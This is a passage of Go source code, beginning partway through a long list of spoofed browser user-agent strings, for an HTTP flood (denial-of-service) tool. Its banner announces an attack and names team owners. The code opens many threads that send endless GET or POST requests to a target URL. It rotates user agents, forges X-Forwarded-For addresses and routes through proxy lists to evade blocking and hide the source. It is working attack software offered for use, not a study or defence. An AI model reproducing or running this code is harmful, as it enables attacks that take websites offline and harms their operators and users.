    "Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/630.4.42 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/630.4.42",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 13_0 like Mac OS X) AppleWebKit/907.3.42 (KHTML, like Gecko) Version/13.0 Mobile/15E148 Safari/907.3.42",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/709.2.3 (KHTML, like Gecko) Version/15.0 Safari/709.2.3",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4193.161 Safari/537.36",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 13_0 like Mac OS X) AppleWebKit/749.4.18 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/749.4.18",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/945.3.3 (KHTML, like Gecko) Version/15.0 Safari/945.3.3",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/626.3.5 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/626.3.5",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 13_0 like Mac OS X) AppleWebKit/762.1.6 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/762.1.6",
    "Mozilla/5.0 (Linux; Android 8; CPH2231) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.4307.189 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64) Edg/93.0.2732.129 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/912.4.32 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/912.4.32",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/118.0.5873.112 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:116.0) Gecko/20100101 Firefox/116.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/945.3.11 (KHTML, like Gecko) Version/15.0 Safari/945.3.11",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/813.5.33 (KHTML, like Gecko) Version/17.0 Safari/813.5.33",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/873.5.26 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/873.5.26",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/95.0.5768.137 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/703.1.26 (KHTML, like Gecko) Version/16.0 Safari/703.1.26",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.4641.193 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/703.4.36 (KHTML, like Gecko) Version/13.0 Safari/703.4.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Edg/91.0.4543.179 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.4680.141 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; Redmi Note 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.5812.136 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; Vivo V21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.4331.197 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/870.3.5 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/870.3.5",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.4483.191 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 7; Realme 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.4522.189 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Redmi Note 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.4543.157 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 13_0 like Mac OS X) AppleWebKit/629.3.36 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/629.3.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/110.0.5242.159 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 7; Realme 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.5319.129 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/710.5.42 (KHTML, like Gecko) Version/13.0 Mobile/15E148 Safari/710.5.42",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/646.4.49 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/646.4.49",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/821.2.21 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/821.2.21",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/824.4.46 (KHTML, like Gecko) Version/16.0 Safari/824.4.46",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 13_0 like Mac OS X) AppleWebKit/891.1.38 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/891.1.38",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.4163.147 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/924.4.48 (KHTML, like Gecko) Version/16.0 Safari/924.4.48",
    "Mozilla/5.0 (Linux; Android 11; Redmi Note 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.4922.189 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.5337.135 Mobile Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_9) AppleWebKit/686.5.22 (KHTML, like Gecko) Version/16.0 Safari/686.5.22",
    "Mozilla/5.0 (X11; Debian; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5317.189 Safari/537.36",
    "Mozilla/5.0 (X11; Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.5739.151 Safari/537.36",
    "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:92.0) Gecko/20100101 Firefox/92.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_9) AppleWebKit/896.5.9 (KHTML, like Gecko) Version/14.0 Safari/896.5.9",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64) Chrome/85.0.5098.133 Safari/537.36",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_9) AppleWebKit/667.2.41 (KHTML, like Gecko) Version/17.0 Safari/667.2.41",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/785.1.41 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/785.1.41",
    "Mozilla/5.0 (Linux; Android 10; M2012K11C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.5941.143 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/93.0.4129.194 Safari/537.36",
    "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.5027.128 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 13_0 like Mac OS X) AppleWebKit/791.4.37 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/791.4.37",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/989.4.9 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/989.4.9",
    "Mozilla/5.0 (X11; Debian; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.5040.133 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; Redmi Note 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.4448.145 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Vivo V21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.5189.112 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Redmi Note 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5513.166 Mobile Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/735.4.45 (KHTML, like Gecko) Version/17.0 Safari/735.4.45",
    "Mozilla/5.0 (Linux; Android 12; M2012K11C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.4821.113 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/687.1.6 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/687.1.6",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.5274.192 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/783.3.48 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/783.3.48",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/724.1.49 (KHTML, like Gecko) Version/14.0 Safari/724.1.49",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/991.3.9 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/991.3.9",
    "Mozilla/5.0 (Linux; Android 14; Redmi Note 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4280.159 Mobile Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.5727.156 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/692.3.6 (KHTML, like Gecko) Version/13.0 Mobile/15E148 Safari/692.3.6",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/634.4.9 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/634.4.9",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/602.5.27 (KHTML, like Gecko) Version/17.0 Safari/602.5.27",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/824.3.29 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/824.3.29",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_9) AppleWebKit/773.4.31 (KHTML, like Gecko) Version/15.0 Safari/773.4.31",
    "Mozilla/5.0 (Linux; Android 10; CPH2231) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5083.169 Mobile Safari/537.36",
    "Mozilla/5.0 (X11; Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4188.185 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 15; Realme 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5220.114 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Vivo V21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4548.124 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 7; M2012K11C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.4513.195 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/924.5.32 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/924.5.32",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 13_0 like Mac OS X) AppleWebKit/841.1.1 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/841.1.1",
    "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0",
    "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:95.0) Gecko/20100101 Firefox/95.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/810.3.44 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/810.3.44",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/972.3.39 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/972.3.39",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/672.4.46 (KHTML, like Gecko) Version/14.0 Safari/672.4.46",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64) Edg/106.0.4566.28 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/763.3.23 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/763.3.23",
    "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/878.5.9 (KHTML, like Gecko) Version/16.0 Safari/878.5.9",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64) Edg/107.0.4671.100 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/610.5.35 (KHTML, like Gecko) Version/13.0 Mobile/15E148 Safari/610.5.35",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/689.1.44 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/689.1.44",
    "Mozilla/5.0 (Linux; Android 11; M2012K11C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.4108.135 Mobile Safari/537.36",
}

func init() {
	rand.Seed(time.Now().UnixNano())
}

func getRandomUA() string {
	return userAgents[rand.Intn(len(userAgents))]
}
func randomIP() string {
    return fmt.Sprintf("%d.%d.%d.%d", rand.Intn(256), rand.Intn(256), rand.Intn(256), rand.Intn(256))
}
func loadProxies(file string) {
	f, err := os.Open(file)
	if err != nil {
		return
	}
	defer f.Close()
	scanner := bufio.NewScanner(f)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" {
			proxies = append(proxies, line)
		}
	}
}

func getConn(addr string) (net.Conn, error) {
	if len(proxies) > 0 {
		proxy := proxies[rand.Intn(len(proxies))]
		conn, err := net.Dial("tcp", proxy)
		if err != nil {
			return nil, err
		}
		connectReq := fmt.Sprintf("CONNECT %s HTTP/1.1\r\nHost: %s\r\n\r\n", addr, host)
		_, err = conn.Write([]byte(connectReq))
		if err != nil {
			return nil, err
		}
		return conn, nil
	}
	return net.Dial("tcp", addr)
}

func flood() {
    addr := host + ":" + port
    for {
        var (
            s   net.Conn
            err error
        )

        if port == "443" {
            cfg := &tls.Config{InsecureSkipVerify: true, ServerName: host}
            s, err = tls.Dial("tcp", addr, cfg)
        } else {
            s, err = getConn(addr)
        }

        if err != nil {
            atomic.AddUint64(&errCount, 1)
            continue
        }

        for i := 0; i < 500; i++ {
            var request string

            if mode == "get" {
                request = fmt.Sprintf("GET %s%s%d HTTP/1.1\r\n", page, key, rand.Intn(999999))
                request += "Host: " + host + "\r\n"
                request += "User-Agent: " + getRandomUA() + "\r\n"
                request += "Accept: */*\r\n"
                request += "Connection: Keep-Alive\r\n\r\n"
            } else if mode == "post" {
                data := fmt.Sprintf("data=%d", rand.Intn(999999))
                request = fmt.Sprintf("POST %s HTTP/1.1\r\n", page)
                request += "Host: " + host + "\r\n"
                request += "User-Agent: " + getRandomUA() + "\r\n"
                request += "Content-Type: application/x-www-form-urlencoded\r\n"
                request += fmt.Sprintf("Content-Length: %d\r\n", len(data))
                request += "Connection: Keep-Alive\r\n"
                request += "X-Forwarded-For: " + randomIP() + "\r\n\r\n"
                request += data
            }

            _, err = s.Write([]byte(request))
            if err != nil {
                atomic.AddUint64(&errCount, 1)
                break
            } else {
                atomic.AddUint64(&sentCount, 1)
            }
        }

        s.Close()
    }
}

func main() {
	if len(os.Args) < 7 {
		fmt.Println("Usage:", os.Args[0], "python3 doom_cannon.py")
		os.Exit(1)
	}

	u, _ := url.Parse(os.Args[1])
	host = strings.Split(u.Host, ":")[0]
	page = u.Path
	if page == "" {
		page = "/"
	}
	mode = strings.ToLower(os.Args[3])
	threads, _ := strconv.Atoi(os.Args[2])
	limit, _ := strconv.Atoi(os.Args[4])
	port = os.Args[6]

	if os.Args[5] != "nil" {
		loadProxies(os.Args[5])
	}

	if strings.Contains(page, "?") {
		key = "&"
	} else {
		key = "?"
	}
        fmt.Println(" *--------* VIONT ATTACK STARTED *---------*")
        fmt.Println(" *--------* Owner : TEAM BCS AND TEAM TSS *---------*")
	fmt.Printf("\n  %-6s of max %-6s |\t%7s |\t%6s\n", "Cur", "Threads", "Sent", "Error")

	for i := 0; i < threads; i++ {
		go flood()
		fmt.Printf("\r%-6d of max %-6d |\t%7d |\t%6d", i+1, threads, 0, 0)
		time.Sleep(50 * time.Microsecond) 
	}

	go func() {
		for {
			fmt.Printf("\r   %-6d of max %-6d |\t%7d |\t%6d",
				threads, threads, atomic.LoadUint64(&sentCount), atomic.LoadUint64(&errCount))
			time.Sleep(500 * time.Millisecond) // update faster
		}
	}()

	close(start)
	time.Sleep(time.Duration(limit) * time.Second)
}
